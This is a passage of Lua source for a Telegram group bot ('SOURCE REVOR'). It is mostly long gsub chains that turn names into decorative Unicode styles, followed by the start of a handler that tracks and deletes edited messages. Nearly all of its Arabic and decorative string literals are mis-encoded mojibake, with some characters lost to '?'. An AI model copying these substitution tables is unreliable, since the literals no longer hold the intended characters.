Zhrf4= Zhrf4:gsub('Ψͺ','ΨͺΩΫΩΩ°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΩΫ')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°Μ²Ϋ')
Zhrf4= Zhrf4:gsub('Ω','ΪͺΩ°ΰΎΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ·','Ψ·Ϋ¨ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf4= Zhrf4:gsub('Ψ‘','Ψ‘')
Zhrf4= Zhrf4:gsub('Ψ€','Ψ€')
Zhrf4= Zhrf4:gsub('Ψ±','Ψ±Ω')
Zhrf4= Zhrf4:gsub('ΩΨ§','ΩΫΨ§')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ')
Zhrf4= Zhrf4:gsub('Ψ©','Ψ©')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°Ω')
Zhrf4= Zhrf4:gsub('Ψ²','Ψ²Ω°Ω')
Zhrf4= Zhrf4:gsub('ΨΈ','ΨΈΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('q','β')
Zhrf4= Zhrf4:gsub('Q','β')
Zhrf4= Zhrf4:gsub('w','π')
Zhrf4= Zhrf4:gsub('W','π')
Zhrf4= Zhrf4:gsub('e','πΌ')
Zhrf4= Zhrf4:gsub('E','πΌ')
Zhrf4= Zhrf4:gsub('r','β')
Zhrf4= Zhrf4:gsub('R','β')
Zhrf4= Zhrf4:gsub('t','π')
Zhrf4= Zhrf4:gsub('T','π')
Zhrf4= Zhrf4:gsub('y','π')
Zhrf4= Zhrf4:gsub('Y','π')
Zhrf4= Zhrf4:gsub('u','π')
Zhrf4= Zhrf4:gsub('i','π')
Zhrf4= Zhrf4:gsub('o','π')
Zhrf4= Zhrf4:gsub('p','β')
Zhrf4= Zhrf4:gsub('a','πΈ')
Zhrf4= Zhrf4:gsub('s','π')
Zhrf4= Zhrf4:gsub('d','π»')
Zhrf4= Zhrf4:gsub('f','π½')
Zhrf4= Zhrf4:gsub('g','πΎ')
Zhrf4= Zhrf4:gsub('h','β')
Zhrf4= Zhrf4:gsub('j','π')
Zhrf4= Zhrf4:gsub('k','π')
Zhrf4= Zhrf4:gsub('U','π')
Zhrf4= Zhrf4:gsub('I','π')
Zhrf4= Zhrf4:gsub('O','π')
Zhrf4= Zhrf4:gsub('P','β')
Zhrf4= Zhrf4:gsub('A','πΈ')
Zhrf4= Zhrf4:gsub('S','π')
Zhrf4= Zhrf4:gsub('D','π»')
Zhrf4= Zhrf4:gsub('F','π½')
Zhrf4= Zhrf4:gsub('G','πΎ')
Zhrf4= Zhrf4:gsub('H','β')
Zhrf4= Zhrf4:gsub('J','π')
Zhrf4= Zhrf4:gsub('K','π')
Zhrf4= Zhrf4:gsub('L','π')
Zhrf4= Zhrf4:gsub('l','π')
Zhrf4= Zhrf4:gsub('z','β€')
Zhrf4= Zhrf4:gsub('Z','β€')
Zhrf4= Zhrf4:gsub('x','π')
Zhrf4= Zhrf4:gsub('X','π')
Zhrf4= Zhrf4:gsub('c','β')
Zhrf4= Zhrf4:gsub('C','β')
Zhrf4= Zhrf4:gsub('v','π')
Zhrf4= Zhrf4:gsub('V','π')
Zhrf4= Zhrf4:gsub('b','πΉ')
Zhrf4= Zhrf4:gsub('B','πΉ')
Zhrf4= Zhrf4:gsub('n','β')
Zhrf4= Zhrf4:gsub('N','β')
Zhrf4= Zhrf4:gsub('m','π')
Zhrf4= Zhrf4:gsub('M','π')



local Zhrf5= text:gsub('ΨΆ','ΨΆΩ')
Zhrf5= Zhrf5:gsub('Ψ΅','Ψ΅Ω')
Zhrf5= Zhrf5:gsub('Ψ«','Ψ«Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('ΨΊ','ΨΊΩ')
Zhrf5= Zhrf5:gsub('ΨΉ','ΨΉΩ')
Zhrf5= Zhrf5:gsub('Ω','ο?­')
Zhrf5= Zhrf5:gsub('Ψ?','Ψ?Ω')
Zhrf5= Zhrf5:gsub('Ψ­','Ψ­Ω')
Zhrf5= Zhrf5:gsub('Ψ¬','Ψ¬Ω')
Zhrf5= Zhrf5:gsub('Ψ―','Ψ―Ω')
Zhrf5= Zhrf5:gsub('Ψ°','Ψ°Ω')
Zhrf5= Zhrf5:gsub('Ψ΄','Ψ΄Ω')
Zhrf5= Zhrf5:gsub('Ψ³','Ψ³Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ¨','Ψ¨Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ§','Ψ£Ω')
Zhrf5= Zhrf5:gsub('Ψͺ','ΨͺΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','Ϊ³Ω')
Zhrf5= Zhrf5:gsub('Ψ·','Ψ·Ω')
Zhrf5= Zhrf5:gsub('Ψ¦','Ψ¦')
Zhrf5= Zhrf5:gsub('Ψ‘','Ψ‘')
Zhrf5= Zhrf5:gsub('Ψ€','Ψ€')
Zhrf5= Zhrf5:gsub('Ψ±','Ψ±Ω')
Zhrf5= Zhrf5:gsub('ΩΨ§','ΩΩΨ£Ω')
Zhrf5= Zhrf5:gsub('Ω','Ω')
Zhrf5= Zhrf5:gsub('Ψ©','Ψ©Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ²','Ψ²Ω')
Zhrf5= Zhrf5:gsub('ΨΈ','ΨΈ')
Zhrf5= Zhrf5:gsub('q','Ζ')
Zhrf5= Zhrf5:gsub('Q','Ζ')
Zhrf5= Zhrf5:gsub('w','w')
Zhrf5= Zhrf5:gsub('W','w')
Zhrf5= Zhrf5:gsub('e','Γ')
Zhrf5= Zhrf5:gsub('E','Γ')
Zhrf5= Zhrf5:gsub('r','r')
Zhrf5= Zhrf5:gsub('R','r')
Zhrf5= Zhrf5:gsub('t','β₯')
Zhrf5= Zhrf5:gsub('T','β₯')
Zhrf5= Zhrf5:gsub('y','Γ½')
Zhrf5= Zhrf5:gsub('Y','Γ½')
Zhrf5= Zhrf5:gsub('u','Β΅')
Zhrf5= Zhrf5:gsub('U','Β΅')
Zhrf5= Zhrf5:gsub('i','Γ')
Zhrf5= Zhrf5:gsub('I','Γ')
Zhrf5= Zhrf5:gsub('o','β')
Zhrf5= Zhrf5:gsub('O','β')
Zhrf5= Zhrf5:gsub('p','Η·')
Zhrf5= Zhrf5:gsub('P','Η·')
Zhrf5= Zhrf5:gsub('a','Βͺ')
Zhrf5= Zhrf5:gsub('A','Βͺ')
Zhrf5= Zhrf5:gsub('s','S')
Zhrf5= Zhrf5:gsub('S','S')
Zhrf5= Zhrf5:gsub('d','Γ')
Zhrf5= Zhrf5:gsub('D','Γ')
Zhrf5= Zhrf5:gsub('f','F')
Zhrf5= Zhrf5:gsub('F','F')
Zhrf5= Zhrf5:gsub('g','ΰ«¬')
Zhrf5= Zhrf5:gsub('G','ΰ«¬')
Zhrf5= Zhrf5:gsub('h','Ι§')
Zhrf5= Zhrf5:gsub('H','Ι§')
Zhrf5= Zhrf5:gsub('j','j')
Zhrf5= Zhrf5:gsub('J','j')
Zhrf5= Zhrf5:gsub('L','Δ»')
Zhrf5= Zhrf5:gsub('l','Δ»')
Zhrf5= Zhrf5:gsub('z','z')
Zhrf5= Zhrf5:gsub('Z','z')
Zhrf5= Zhrf5:gsub('x','Γ')
Zhrf5= Zhrf5:gsub('X','Γ')
Zhrf5= Zhrf5:gsub('c','Β’')
Zhrf5= Zhrf5:gsub('C','Β’')
Zhrf5= Zhrf5:gsub('v','β')
Zhrf5= Zhrf5:gsub('V','β')
Zhrf5= Zhrf5:gsub('b','b')
Zhrf5= Zhrf5:gsub('B','b')
Zhrf5= Zhrf5:gsub('n','Ξ·')
Zhrf5= Zhrf5:gsub('N','Ξ·')
Zhrf5= Zhrf5:gsub('m','ΠΌ')
Zhrf5= Zhrf5:gsub('M','ΠΌ')



local Zhrf6= text:gsub('ΨΆ','οΊΏΝ Μ­')
Zhrf6= Zhrf6:gsub('Ψ΅','οΊ»Ν‘')
Zhrf6= Zhrf6:gsub('Ψ«','οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','ο­°')
Zhrf6= Zhrf6:gsub('Ω','ο»Μ²')
Zhrf6= Zhrf6:gsub('ΨΊ','ο»Μ²')
Zhrf6= Zhrf6:gsub('ΨΉ','ο»Μ²')
Zhrf6= Zhrf6:gsub('Ω','ο?¬ΜΜ²')
Zhrf6= Zhrf6:gsub('Ψ?','Ψ?Ω')
Zhrf6= Zhrf6:gsub('Ψ­','οΊ£Μ')
Zhrf6= Zhrf6:gsub('Ψ¬','Ψ¬Ω')
Zhrf6= Zhrf6:gsub('Ψ―','ΪΜ')
Zhrf6= Zhrf6:gsub('Ψ°','Ψ°Ω')
Zhrf6= Zhrf6:gsub('Ψ΄','οΊ·Μ²')
Zhrf6= Zhrf6:gsub('Ψ³','οΊ³Μ')
Zhrf6= Zhrf6:gsub('Ω','ο―ΎΜΜ')
Zhrf6= Zhrf6:gsub('Ψ¨','οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ψ§Μο»')
Zhrf6= Zhrf6:gsub('Ψ§','οΊΜ')
Zhrf6= Zhrf6:gsub('Ψͺ','ΩΌΩ')
Zhrf6= Zhrf6:gsub('Ω','ο»§Μ²')
Zhrf6= Zhrf6:gsub('Ω','ο»£ΜΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ϊ―')
Zhrf6= Zhrf6:gsub('Ψ·','ο»Μ²')
Zhrf6= Zhrf6:gsub('Ψ¦',' ΩΩ°Ψ¦')
Zhrf6= Zhrf6:gsub('Ψ‘','Ψ‘')
Zhrf6= Zhrf6:gsub('Ψ€','Ψ€')
Zhrf6= Zhrf6:gsub('Ψ±','ΫΪ')
Zhrf6= Zhrf6:gsub('ΩΨ§','ο»Μ²οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ω')
Zhrf6= Zhrf6:gsub('Ψ©','Ψ©')
Zhrf6= Zhrf6:gsub('Ω','ΫΫΫ')
Zhrf6= Zhrf6:gsub('Ψ²','Ψ²Ω')
Zhrf6= Zhrf6:gsub('ΨΈ','ο»Μ²')
Zhrf6= Zhrf6:gsub('q','α³')
Zhrf6= Zhrf6:gsub('Q','α³')
Zhrf6= Zhrf6:gsub('w','Π¨')
Zhrf6= Zhrf6:gsub('W','Π¨')
Zhrf6= Zhrf6:gsub('e','Ξ£')
Zhrf6= Zhrf6:gsub('E','Ξ£')
Zhrf6= Zhrf6:gsub('r','Ξ')
Zhrf6= Zhrf6:gsub('R','Ξ')
Zhrf6= Zhrf6:gsub('t','Ζ¬')
Zhrf6= Zhrf6:gsub('T','Ζ¬')
Zhrf6= Zhrf6:gsub('y','Ξ¨')
Zhrf6= Zhrf6:gsub('Y','Ξ¨')
Zhrf6= Zhrf6:gsub('u','Ζ±')
Zhrf6= Zhrf6:gsub('U','Ζ±')
Zhrf6= Zhrf6:gsub('i','I')
Zhrf6= Zhrf6:gsub('I','I')
Zhrf6= Zhrf6:gsub('o','Ξ')
Zhrf6= Zhrf6:gsub('O','Ξ')
Zhrf6= Zhrf6:gsub('p','Ζ€')
Zhrf6= Zhrf6:gsub('P','Ζ€')
Zhrf6= Zhrf6:gsub('a','Ξ')
Zhrf6= Zhrf6:gsub('A','Ξ')
Zhrf6= Zhrf6:gsub('s','Π')
Zhrf6= Zhrf6:gsub('S','Π')
Zhrf6= Zhrf6:gsub('d','D')
Zhrf6= Zhrf6:gsub('D','D')
Zhrf6= Zhrf6:gsub('f','F')
Zhrf6= Zhrf6:gsub('F','F')
Zhrf6= Zhrf6:gsub('g','G')
Zhrf6= Zhrf6:gsub('G','G')
Zhrf6= Zhrf6:gsub('h','H')
Zhrf6= Zhrf6:gsub('H','H')
Zhrf6= Zhrf6:gsub('j','J')
Zhrf6= Zhrf6:gsub('J','J')
Zhrf6= Zhrf6:gsub('L','L')
Zhrf6= Zhrf6:gsub('l','L')
Zhrf6= Zhrf6:gsub('z','Z')
Zhrf6= Zhrf6:gsub('Z','Z')
Zhrf6= Zhrf6:gsub('x','Π')
Zhrf6= Zhrf6:gsub('X','Π')
Zhrf6= Zhrf6:gsub('c','C')
Zhrf6= Zhrf6:gsub('C','C')
Zhrf6= Zhrf6:gsub('v','Ζ²')
Zhrf6= Zhrf6:gsub('V','Ζ²')
Zhrf6= Zhrf6:gsub('b','Ζ')
Zhrf6= Zhrf6:gsub('B','Ζ')
Zhrf6= Zhrf6:gsub('n','β')
Zhrf6= Zhrf6:gsub('N','β')
Zhrf6= Zhrf6:gsub('m','Ξ')
Zhrf6= Zhrf6:gsub('M','Ξ')



local Zhrf7= text:gsub('ΨΆ','οΊΏ')
Zhrf7= Zhrf7:gsub('Ψ΅','οΊ»')
Zhrf7= Zhrf7:gsub('Ψ«','ο­₯')
Zhrf7= Zhrf7:gsub('Ω','ο»Μ?ΩΜ')
Zhrf7= Zhrf7:gsub('Ω','ο­¬')
Zhrf7= Zhrf7:gsub('ΨΊ','ο»ΜΜ£')
Zhrf7= Zhrf7:gsub('ΨΉ','ο»')
Zhrf7= Zhrf7:gsub('Ω','ΪΎΩΫΩ')
Zhrf7= Zhrf7:gsub('Ψ?','οΊ§')
Zhrf7= Zhrf7:gsub('Ψ­','Χ€')
Zhrf7= Zhrf7:gsub('Ψ¬','ο­΄')
Zhrf7= Zhrf7:gsub('Ψ―','ο?')
Zhrf7= Zhrf7:gsub('Ψ°','Ψ°')
Zhrf7= Zhrf7:gsub('Ψ΄','οΊ·')
Zhrf7= Zhrf7:gsub('Ψ³','οΊ³')
Zhrf7= Zhrf7:gsub('Ω','ο―Ύ')
Zhrf7= Zhrf7:gsub('Ψ¨','οΊ')
Zhrf7= Zhrf7:gsub('Ω','ο»')
Zhrf7= Zhrf7:gsub('Ψ§','οΊ')
Zhrf7= Zhrf7:gsub('Ψͺ','ο­ ')
Zhrf7= Zhrf7:gsub('Ω','ο»§')
Zhrf7= Zhrf7:gsub('Ω','ο»£ΜΜ')
Zhrf7= Zhrf7:gsub('Ω','Ϊ―Ω')
Zhrf7= Zhrf7:gsub('Ψ·','ο»Ω')
Zhrf7= Zhrf7:gsub('Ψ¦','Ω°Ψ¦Ω')
Zhrf7= Zhrf7:gsub('Ψ‘','Ψ‘')
Zhrf7= Zhrf7:gsub('Ψ€','ο―')
Zhrf7= Zhrf7:gsub('Ψ±','ΪΩ')
Zhrf7= Zhrf7:gsub('ΩΨ§','ο»Ψ’')
Zhrf7= Zhrf7:gsub('Ω','Ωο?―')
Zhrf7= Zhrf7:gsub('Ψ©','Ψ©')
Zhrf7= Zhrf7:gsub('Ω','Ϋ')
Zhrf7= Zhrf7:gsub('Ψ²','Ϊ')
Zhrf7= Zhrf7:gsub('ΨΈ','ο»')
Zhrf7= Zhrf7:gsub('q','ΰΉ')
Zhrf7= Zhrf7:gsub('Q','ΰΉ')
Zhrf7= Zhrf7:gsub('w','ΰΊ')
Zhrf7= Zhrf7:gsub('W','ΰΊ')
Zhrf7= Zhrf7:gsub('e','Δ')
Zhrf7= Zhrf7:gsub('E','Δ')
Zhrf7= Zhrf7:gsub('r','r')
Zhrf7= Zhrf7:gsub('R','r')
Zhrf7= Zhrf7:gsub('t','t')
Zhrf7= Zhrf7:gsub('T','t')
Zhrf7= Zhrf7:gsub('y','ΰΈ―')
Zhrf7= Zhrf7:gsub('Y','ΰΈ―')
Zhrf7= Zhrf7:gsub('u','ΰΈ')
Zhrf7= Zhrf7:gsub('U','ΰΈ')
Zhrf7= Zhrf7:gsub('i','i')
Zhrf7= Zhrf7:gsub('I','i')
Zhrf7= Zhrf7:gsub('o','ΰ»')
Zhrf7= Zhrf7:gsub('O','ΰ»')
Zhrf7= Zhrf7:gsub('p','p')
Zhrf7= Zhrf7:gsub('P','p')
Zhrf7= Zhrf7:gsub('a','ΰΈ')
Zhrf7= Zhrf7:gsub('A','ΰΈ')
Zhrf7= Zhrf7:gsub('s','Ε')
Zhrf7= Zhrf7:gsub('S','Ε')
Zhrf7= Zhrf7:gsub('d','ΰ»')
Zhrf7= Zhrf7:gsub('D','ΰ»')
Zhrf7= Zhrf7:gsub('f','f')
Zhrf7= Zhrf7:gsub('F','f')
Zhrf7= Zhrf7:gsub('g','ΰΊ')
Zhrf7= Zhrf7:gsub('G','ΰΊ')
Zhrf7= Zhrf7:gsub('h','h')
Zhrf7= Zhrf7:gsub('H','h')
Zhrf7= Zhrf7:gsub('j','ΰΈ§')
Zhrf7= Zhrf7:gsub('J','ΰΈ§')
Zhrf7= Zhrf7:gsub('k','k')
Zhrf7= Zhrf7:gsub('K','k')
Zhrf7= Zhrf7:gsub('L','l')
Zhrf7= Zhrf7:gsub('l','l')
Zhrf7= Zhrf7:gsub('z','ΰΊ')
Zhrf7= Zhrf7:gsub('Z','ΰΊ')
Zhrf7= Zhrf7:gsub('x','x')
Zhrf7= Zhrf7:gsub('X','x')
Zhrf7= Zhrf7:gsub('c','Β’')
Zhrf7= Zhrf7:gsub('C','Β’')
Zhrf7= Zhrf7:gsub('v','ΰΈ')
Zhrf7= Zhrf7:gsub('V','ΰΈ')
Zhrf7= Zhrf7:gsub('b','ΰΉ')
Zhrf7= Zhrf7:gsub('B','ΰΉ')
Zhrf7= Zhrf7:gsub('n','ΰΊ')
Zhrf7= Zhrf7:gsub('N','ΰΊ')
Zhrf7= Zhrf7:gsub('m','ΰΉ')
Zhrf7= Zhrf7:gsub('M','ΰΉ')



local Zhrf8= text:gsub('ΨΆ','ΨΆ');
Zhrf8= Zhrf8:gsub('Ψ΅','Ψ΅ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ«','Ψ«ΫΩ°Ω')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('ΨΊ','ΨΊΩΩ')
Zhrf8= Zhrf8:gsub('ΨΉ','ΨΉ')
Zhrf8= Zhrf8:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf8= Zhrf8:gsub('Ψ?','Ψ?Ψ?ΩΩ')
Zhrf8= Zhrf8:gsub('Ψ­','Ψ­ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ¬','Ψ¬Ψ¬ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ―','Ψ―Ω')
Zhrf8= Zhrf8:gsub('Ψ°','Ψ°Ω')
Zhrf8= Zhrf8:gsub('Ψ΄','Ψ΄Ψ΄ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ³','Ψ³ΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΩ°')
Zhrf8= Zhrf8:gsub('Ψ¨','Ψ¨Ω°Ω°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ§','Ψ’')
Zhrf8= Zhrf8:gsub('Ψͺ','ΨͺΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ω','ΩΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ·','Ψ·ΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ¦',' ΩΨ¦Ω°')
Zhrf8= Zhrf8:gsub('Ψ‘','Ψ‘')
Zhrf8= Zhrf8:gsub('Ψ€','Ψ€Ψ€Ω')
Zhrf8= Zhrf8:gsub('Ψ±','Ψ±Ω')
Zhrf8= Zhrf8:gsub('ΩΨ§','ΩΫΩ°Ψ§')
Zhrf8= Zhrf8:gsub('Ω','ΩΫΩ°')
Zhrf8= Zhrf8:gsub('Ψ©','Ψ©')
Zhrf8= Zhrf8:gsub('Ω','ΫΩ°Ω')
Zhrf8= Zhrf8:gsub('Ψ²','Ψ²')
Zhrf8= Zhrf8:gsub('ΨΈ','ΨΈΫΩ°')
Zhrf8= Zhrf8:gsub('q','Υ¦')
Zhrf8= Zhrf8:gsub('Q','Υ¦')
Zhrf8= Zhrf8:gsub('w','Υ‘')
Zhrf8= Zhrf8:gsub('W','Υ‘')
Zhrf8= Zhrf8:gsub('e','Ι')
Zhrf8= Zhrf8:gsub('E','Ι')
Zhrf8= Zhrf8:gsub('r','Κ')
Zhrf8= Zhrf8:gsub('R','Κ')
Zhrf8= Zhrf8:gsub('t','ΘΆ')
Zhrf8= Zhrf8:gsub('T','ΘΆ')
Zhrf8= Zhrf8:gsub('y','Κ')
Zhrf8= Zhrf8:gsub('Y','Κ')
Zhrf8= Zhrf8:gsub('u','Κ')
Zhrf8= Zhrf8:gsub('U','Κ')
Zhrf8= Zhrf8:gsub('i','Ι¨')
Zhrf8= Zhrf8:gsub('I','Ι¨')
Zhrf8= Zhrf8:gsub('o','Φ')
Zhrf8= Zhrf8:gsub('O','Φ')
Zhrf8= Zhrf8:gsub('p','Φ')
Zhrf8= Zhrf8:gsub('P','Φ')
Zhrf8= Zhrf8:gsub('a','Η')
Zhrf8= Zhrf8:gsub('A','Η')
Zhrf8= Zhrf8:gsub('s','Φ')
Zhrf8= Zhrf8:gsub('S','Φ')
Zhrf8= Zhrf8:gsub('d','Ι')
Zhrf8= Zhrf8:gsub('D','Ι')
Zhrf8= Zhrf8:gsub('f','Κ')
Zhrf8= Zhrf8:gsub('F','Κ')
Zhrf8= Zhrf8:gsub('g','Ι’')
Zhrf8= Zhrf8:gsub('G','Ι’')
Zhrf8= Zhrf8:gsub('h','Ι¦')
Zhrf8= Zhrf8:gsub('H','Ι¦')
Zhrf8= Zhrf8:gsub('j','Κ')
Zhrf8= Zhrf8:gsub('J','Κ')
Zhrf8= Zhrf8:gsub('k','Σ')
Zhrf8= Zhrf8:gsub('K','Σ')
Zhrf8= Zhrf8:gsub('L','Κ')
Zhrf8= Zhrf8:gsub('l','Κ')
Zhrf8= Zhrf8:gsub('z','Κ')
Zhrf8= Zhrf8:gsub('Z','Κ')
Zhrf8= Zhrf8:gsub('x','ΣΌ')
Zhrf8= Zhrf8:gsub('X','ΣΌ')
Zhrf8= Zhrf8:gsub('c','Ζ')
Zhrf8= Zhrf8:gsub('C','Ζ')
Zhrf8= Zhrf8:gsub('v','Κ')
Zhrf8= Zhrf8:gsub('V','Κ')
Zhrf8= Zhrf8:gsub('b','Ι?')
Zhrf8= Zhrf8:gsub('B','Ι?')
Zhrf8= Zhrf8:gsub('n','ΥΌ')
Zhrf8= Zhrf8:gsub('N','ΥΌ')
Zhrf8= Zhrf8:gsub('m','Κ')
Zhrf8= Zhrf8:gsub('M','Κ')



local Zhrf9= text:gsub('ΨΆ','ΨΆ')
Zhrf9= Zhrf9:gsub('Ψ΅','Ψ΅')
Zhrf9= Zhrf9:gsub('Ψ«','Ψ«')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('ΨΊ','ΨΊ')
Zhrf9= Zhrf9:gsub('ΨΉ','ΨΉΩ')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ?','Ψ?Ω')
Zhrf9= Zhrf9:gsub('Ψ­','Ψ­Ω')
Zhrf9= Zhrf9:gsub('Ψ¬','Ψ¬Ω')
Zhrf9= Zhrf9:gsub('Ψ―','Ψ―Ω')
Zhrf9= Zhrf9:gsub('Ψ°','Ψ°Ω')
Zhrf9= Zhrf9:gsub('Ψ΄','Ψ΄Ω')
Zhrf9= Zhrf9:gsub('Ψ³','Ψ³')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ψ¨','Ψ¨Ω')
Zhrf9= Zhrf9:gsub('Ω','ΩΩΩ')
Zhrf9= Zhrf9:gsub('Ψ§','Ψ’')
Zhrf9= Zhrf9:gsub('Ψͺ','Ψͺ')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ω','Ω')
Zhrf9= Zhrf9:gsub('Ω','Ϊͺ')
Zhrf9= Zhrf9:gsub('Ψ·','Ψ·Ω')
Zhrf9= Zhrf9:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf9= Zhrf9:gsub('Ψ‘','Ψ‘')
Zhrf9= Zhrf9:gsub('Ψ€','Ψ€')
Zhrf9= Zhrf9:gsub('Ψ±','Ψ±')
Zhrf9= Zhrf9:gsub('ΩΨ§','ΩΩΩΨ’')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ©','Ψ©')
Zhrf9= Zhrf9:gsub('Ω','ΩΩ')
Zhrf9= Zhrf9:gsub('Ψ²','Ψ²')
Zhrf9= Zhrf9:gsub('ΨΈ','ΨΈΩΩ')
Zhrf9= Zhrf9:gsub('q','Q')
Zhrf9= Zhrf9:gsub('Q','Q')
Zhrf9= Zhrf9:gsub('w','αΊ')
Zhrf9= Zhrf9:gsub('W','αΊ')
Zhrf9= Zhrf9:gsub('e','αΌ')
Zhrf9= Zhrf9:gsub('E','αΌ')
Zhrf9= Zhrf9:gsub('r','Θ')
Zhrf9= Zhrf9:gsub('R','Θ')
Zhrf9= Zhrf9:gsub('t','?¬')
Zhrf9= Zhrf9:gsub('T','?¬')
Zhrf9= Zhrf9:gsub('y','α½')
Zhrf9= Zhrf9:gsub('Y','α½')
Zhrf9= Zhrf9:gsub('u','Θ')
Zhrf9= Zhrf9:gsub('U','Θ')
Zhrf9= Zhrf9:gsub('i','αΌΏ')
Zhrf9= Zhrf9:gsub('I','αΌΏ')
Zhrf9= Zhrf9:gsub('o','α½')
Zhrf9= Zhrf9:gsub('O','α½')
Zhrf9= Zhrf9:gsub('p','Ζ€')
Zhrf9= Zhrf9:gsub('P','Ζ€')
Zhrf9= Zhrf9:gsub('a','αΎ')
Zhrf9= Zhrf9:gsub('A','αΎ')
Zhrf9= Zhrf9:gsub('s','αΉ¨')
Zhrf9= Zhrf9:gsub('S','αΉ¨')
Zhrf9= Zhrf9:gsub('d','Ζ')
Zhrf9= Zhrf9:gsub('D','Ζ')
Zhrf9= Zhrf9:gsub('f','?')
Zhrf9= Zhrf9:gsub('F','?')
Zhrf9= Zhrf9:gsub('g','Ζ')
Zhrf9= Zhrf9:gsub('G','Ζ')
Zhrf9= Zhrf9:gsub('h','αΌ¬')
Zhrf9= Zhrf9:gsub('H','αΌ¬')
Zhrf9= Zhrf9:gsub('j','Π')
Zhrf9= Zhrf9:gsub('J','Π')
Zhrf9= Zhrf9:gsub('k','αΈ°')
Zhrf9= Zhrf9:gsub('K','αΈ°')
Zhrf9= Zhrf9:gsub('L','ΔΏ')
Zhrf9= Zhrf9:gsub('l','ΔΏ')
Zhrf9= Zhrf9:gsub('z','αΊ')
Zhrf9= Zhrf9:gsub('Z','αΊ')
Zhrf9= Zhrf9:gsub('x','αΊ')
Zhrf9= Zhrf9:gsub('X','αΊ')
Zhrf9= Zhrf9:gsub('c','Ζ')
Zhrf9= Zhrf9:gsub('C','Ζ')
Zhrf9= Zhrf9:gsub('v','V')
Zhrf9= Zhrf9:gsub('V','V')
Zhrf9= Zhrf9:gsub('b','Ο')
Zhrf9= Zhrf9:gsub('B','Ο')
Zhrf9= Zhrf9:gsub('n','Ζ')
Zhrf9= Zhrf9:gsub('N','Ζ')
Zhrf9= Zhrf9:gsub('m','αΉ')
Zhrf9= Zhrf9:gsub('M','αΉ')


local Text_Zhrfa = "1- `"..Zhrf..EmojeS[math.random(#EmojeS)]
.."`\n\n2- `"..Zhrf2..EmojeS[math.random(#EmojeS)]
.."`\n\n3- `"..Zhrf3..EmojeS[math.random(#EmojeS)]
.."`\n\n4- `"..Zhrf4..EmojeS[math.random(#EmojeS)]
.."`\n\n5- `"..Zhrf5..EmojeS[math.random(#EmojeS)]
.."`\n\n6- `"..Zhrf6..EmojeS[math.random(#EmojeS)]
.."`\n\n7- `"..Zhrf7..EmojeS[math.random(#EmojeS)]
.."`\n\n8- `"..Zhrf8..Emoje[math.random(#Emoje)]
.."`\n\n9- `"..Zhrf9..Emoje[math.random(#Emoje)]
.."`\n\n10- `"..Zhrf5..Emoje[math.random(#Emoje)]
Text_Zhrfa = Text_Zhrfa.."`\n\n| Ψ§ΨΆΨΊΨ· ΨΉ Ψ§ΩΨ§Ψ³Ω ΩΩΨͺΩ Ψ§ΩΩΨ³Ψ? \nβ"
send(msg.chat_id_,msg.id_,''..Text_Zhrfa..'\n----------SOURCE REVOR-----------\n')
return false
end

------------------------------------------------------------------------
Tshake_Started_Bot(msg,data)
Tshake_Files(msg)
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
if msg.reply_markup_ and msg.reply_markup_.rows_ then return false end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'message_edit'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."Lock:edit"..msg.chat_id_) and not Text and not SupCreator(result) then
Reply_Status(result,result.sender_user_id_,"reply","Ω­ ΩΨ§Ω Ψ¨Ψ§ΩΨͺΨΉΨ―ΩΩ ΨΉΩΩ Ψ§ΩΩΩΨ―ΩΨ§") 
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
end
local text = result.content_.text_
if not Admin(result) then
------------------------------------------------------------------------
